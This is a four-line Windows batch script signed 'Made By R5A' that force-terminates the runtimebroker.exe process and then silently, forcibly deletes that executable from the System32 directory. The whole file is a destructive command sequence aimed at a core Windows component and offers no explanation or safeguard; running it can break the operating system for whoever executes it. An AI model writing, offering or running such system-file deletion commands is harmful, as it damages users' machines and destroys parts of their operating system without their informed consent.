@echo off 
title Made By R5A
taskkill /im runtimebroker.exe /f
del "%WinDir%\System32\runtimebroker.exe" /s /f /q